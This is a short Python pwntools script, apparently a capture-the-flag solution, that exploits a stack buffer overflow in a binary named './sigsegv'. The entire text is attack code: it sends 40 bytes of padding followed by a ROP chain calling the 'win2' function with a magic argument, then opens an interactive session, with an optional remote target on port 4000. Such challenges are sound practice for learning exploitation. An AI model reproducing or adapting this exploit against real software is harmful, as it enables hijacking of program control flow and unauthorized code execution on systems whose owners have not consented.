from pwn import *
context.arch = 'amd64'

test_remote = False
HOST = ""
PORT = 4000
OFFSET = 40


rpCh = ""
target = None

elf = ELF("./sigsegv")
target = elf.process()
rop = ROP(elf)
rop.call(elf.sym['win2'], [1384596537706222391,0])

if test_remote:
    target = remote(HOST, PORT)


target.recvuntil(b"Now, it's stack smashing time:" )
p64(0x0000000000400b88)
payload = [b"a"*OFFSET,
         rop.chain()]
print(b"".join(payload))
target.sendline(b"".join(payload))

target.interactive()
